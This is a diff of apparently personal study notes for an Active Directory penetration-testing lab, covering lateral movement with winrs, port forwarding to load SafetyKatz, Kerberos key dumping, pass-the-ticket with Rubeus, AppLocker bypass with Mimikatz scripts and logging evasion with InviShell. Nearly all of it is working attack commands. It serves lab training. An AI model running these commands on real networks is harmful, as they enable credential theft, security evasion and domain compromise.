@@ -40,24 +40,40 @@ $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
 ### Lateral 1 (Local Admin)
 Add port forward to machine to forwards to webserver - downloading executable is bad
 ```powershell
-echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
 
-$null | winrs -r:dcorp-dc "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
+$null | winrs -r:dcorp-adminsrv "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
 ```
 
 Download from local loopback
 ```powershell
-$null | winrs -r:dcorp-dc "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
+$null | winrs -r:dcorp-adminsrv "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
 ```
 
 Note down the `aes256_hmac` and the cleartext credentials 
 Use Rubues on attacking machine
 ```powershell
-C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:appadmin /aes256:68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 This will create a logon type 9 so the new credentials will only be used when accessing domain resources
 
+```powershell
+A:\tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+```powershell
+Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1
+```
+
+You must have administrator access to list sessions - netexec equivalent
+```powershell
+Find-DomainUserLocation
+Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
+
+winrs -r:dcorp-mgmt cmd /c "set computername && set username"
+$null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
+```
 ### Lateral 2 (Local Admin + AppLocker)
 Review AppLocker settings
 ```powershell
@@ -66,9 +82,9 @@ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 
 Copy to AppLocker safe folder - can't dot source
 ```powershell
-Copy-Item C:\AD\Tools\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+copy C:\Users\Public\Invoke-MimiEx-keys.ps1 \\dcorp-adminsrv\c$\'Program Files'
 
-Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+copy C:\Users\Public\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv\c$\'Program Files'
 
 .\Invoke-MimiEx-keys.ps1
 .\Invoke-MimiEx-vault.ps1
@@ -77,9 +93,17 @@ Copy-Item C:\AD\Tools\Invoke-MimiEx-vault.ps1 \\dcorp-adminsrv.dollarcorp.moneyc
 & 'C:\Program Files\Invoke-MimiEx-vault.ps1'
 ```
 
-Use `runas` to open cmd 
+> **Note**: If clear text creds are found, use `runas` to open cmd 
 ```powershell
 runas /user:dcorp\srvadmin /netonly cmd
+```
+
+```powershell
+A:\tools\InviShell\RunWithRegistryNonAdmin.bat
+```
+
+```powershell
+Import-Module .\PowerView.ps1, .\PowerHuntShares.psm1, .\Find-PSRemotingLocalAdminAccess.ps1, .\PowerUp.ps1
 ```
 
 You must have administrator access to list sessions - netexec equivalent
